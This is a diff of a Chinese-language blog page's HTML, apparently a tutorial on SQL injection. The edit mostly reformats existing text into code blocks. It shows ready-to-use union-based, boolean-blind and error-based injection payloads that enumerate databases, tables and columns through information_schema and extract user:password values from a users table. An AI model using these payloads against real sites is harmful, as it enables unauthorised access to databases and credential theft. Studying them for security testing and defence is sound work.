@@ -421,10 +421,14 @@ schemata 表字段schema_name 记录着库的信息
 </ol>
 <h1 id="00x3-sql注入"><a href="#00x3-sql注入" class="headerlink" title="00x3 sql注入"></a>00x3 sql注入</h1><h3 id="1、sql注入原理"><a href="#1、sql注入原理" class="headerlink" title="1、sql注入原理"></a>1、sql注入原理</h3><p>● 参数用户可控</p>
 <p>● 参数带入数据库查询</p>
-<h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><p>● 数字型注入：/1 和 /0回显不一样。或者传入id=1 and 1=1 和id=1 and 1=2回显不一样等等</p>
-<p>● 字符型注入：’ 和 ‘’ 回显不一样，单数的和双数的单引号回显规不规律</p>
-<h3 id="3、注释符"><a href="#3、注释符" class="headerlink" title="3、注释符"></a>3、注释符</h3><p>● 单行注释：减减加(–+)，减减空格(– )，#</p>
-<p>● 多行注释：/<em>……</em>/</p>
+<h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><pre class="line-numbers language-bash"><code class="language-bash">● 数字型注入：/1和/0回显不一样。或者传入id<span class="token operator">=</span>1 and 1<span class="token operator">=</span>1和id<span class="token operator">=</span>1 and 1<span class="token operator">=</span>2回显不一样等等
+
+● 字符型注入：<span class="token string">' 和 '</span>' 回显不一样，单数的和双数的单引号回显规不规律
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="3、注释符"><a href="#3、注释符" class="headerlink" title="3、注释符"></a>3、注释符</h3><pre class="line-numbers language-bash"><code class="language-bash">● 单行注释：减减加<span class="token punctuation">(</span>--+<span class="token punctuation">)</span>，减减空格<span class="token punctuation">(</span>-- <span class="token punctuation">)</span>，<span class="token comment" spellcheck="true">#</span>
+
+● 多行注释：/*<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>*/
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h1 id="00x4-sql注入分类"><a href="#00x4-sql注入分类" class="headerlink" title="00x4 sql注入分类"></a>00x4 sql注入分类</h1><h2 id="1、union联合注入"><a href="#1、union联合注入" class="headerlink" title="1、union联合注入"></a>1、union联合注入</h2><p>含义：联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段数要相同，不然会出现报错。</p>
 <h4 id="●-Limit"><a href="#●-Limit" class="headerlink" title="● Limit"></a>● Limit</h4><p>Limit是指限定查询的条数。有三种方式：</p>
 <h5 id="方式一：limit-参数1"><a href="#方式一：limit-参数1" class="headerlink" title="方式一：limit 参数1"></a>方式一：limit 参数1</h5><p>参数1可从1开始，往后递增，表示要查询几条数据。</p>
@@ -433,15 +437,19 @@ schemata 表字段schema_name 记录着库的信息
 <p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p>
 <h5 id="方式三：limit-参数1-offset-参数2"><a href="#方式三：limit-参数1-offset-参数2" class="headerlink" title="方式三：limit 参数1 offset 参数2"></a>方式三：limit 参数1 offset 参数2</h5><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p>
 <p>例如：limit 1 offset 0 表示查询第一条参数。</p>
-<h3 id="（1）判断"><a href="#（1）判断" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p>
-<p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p>
-<h3 id="（2）判断字段数"><a href="#（2）判断字段数" class="headerlink" title="（2）判断字段数"></a>（2）判断字段数</h3><p>公式：order by n-1    到n出错时，则字段数为n-1</p>
-<h3 id="（3）获取敏感信息"><a href="#（3）获取敏感信息" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><p> -1 union select 1,2–+</p>
-<p> (-1是让前面的表查询的内容不存在，将1或2可替换成version(),database(),user()等）</p>
-<pre class="line-numbers language-bash"><code class="language-bash">例1：-1<span class="token string">' union select 1,user()
+<h3 id="（1）判断"><a href="#（1）判断" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">传入1正常，传入1<span class="token string">'报错
+
+传入1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1和传入1'</span> and <span class="token string">'1'</span><span class="token operator">=</span>'2页面回显不一样
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="（2）判断字段数"><a href="#（2）判断字段数" class="headerlink" title="（2）判断字段数"></a>（2）判断字段数</h3><pre class="line-numbers language-bash"><code class="language-bash">公式：order by n-1    到n出错时，则字段数为n-1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="（3）获取敏感信息"><a href="#（3）获取敏感信息" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">-1 union <span class="token keyword">select</span> 1,2--+
+<span class="token punctuation">(</span>-1是让前面的表查询的内容不存在，将1或2可替换成version<span class="token punctuation">(</span><span class="token punctuation">)</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,user<span class="token punctuation">(</span><span class="token punctuation">)</span>等）
+
+例1：-1<span class="token string">' union select 1,user()
 
 例2：-1'</span> union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x3a,database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="（4）获取表"><a href="#（4）获取表" class="headerlink" title="（4）获取表"></a>（4）获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="（5）获取字段"><a href="#（5）获取字段" class="headerlink" title="（5）获取字段"></a>（5）获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">-1’ union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>--+
@@ -453,8 +461,10 @@ schemata 表字段schema_name 记录着库的信息
 <p>● 参数1是语句，参数2表示正确时显示，参数3表示错误时显示</p>
 <h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>● substr(参数1，参数2，参数3）</p>
 <p>● 参数1是字符串，参数2是开始截取（索引从1开始），参数3是截取的长度</p>
-<h3 id="（1）判断-1"><a href="#（1）判断-1" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p>
-<p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p>
+<h3 id="（1）判断-1"><a href="#（1）判断-1" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">传入1正常，传入1<span class="token string">'报错
+
+传入1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1 和传入 1'</span> and <span class="token string">'1'</span><span class="token operator">=</span>'2  页面回显不一样
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="（2）获取敏感信息"><a href="#（2）获取敏感信息" class="headerlink" title="（2）获取敏感信息"></a>（2）获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and if(substr(user(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 
 判断数据库用户名第一个字符是否为a，是则返回1，否则返回0
@@ -470,7 +480,8 @@ schemata 表字段schema_name 记录着库的信息
 <h3 id="（6）获取表的内容"><a href="#（6）获取表的内容" class="headerlink" title="（6）获取表的内容"></a>（6）获取表的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">1’ and if<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span>from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>,1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>含义：数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。</p>
-<h3 id="（1）判断-2"><a href="#（1）判断-2" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>输入单引号 如果报错有可能存在报错注入，如果拼接 SQL 语句带入到 mysql 执行即存在报错注入</p>
+<h3 id="（1）判断-2"><a href="#（1）判断-2" class="headerlink" title="（1）判断"></a>（1）判断</h3><pre class="line-numbers language-bash"><code class="language-bash">输入单引号，如果报错有可能存在报错注入，如果拼接SQL语句带入到mysql执行即存在报错注入
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="（2）获取库名"><a href="#（2）获取库名" class="headerlink" title="（2）获取库名"></a>（2）获取库名</h3><pre class="line-numbers language-bash"><code class="language-bash">1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 
 原理：会报错显示当前库（库名会显示出来）不存在这个函数
@@ -1125,7 +1136,7 @@ schemata 表字段schema_name 记录着库的信息
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">47.2k</span>
+                        class="white-color">47.1k</span>
             
             
             
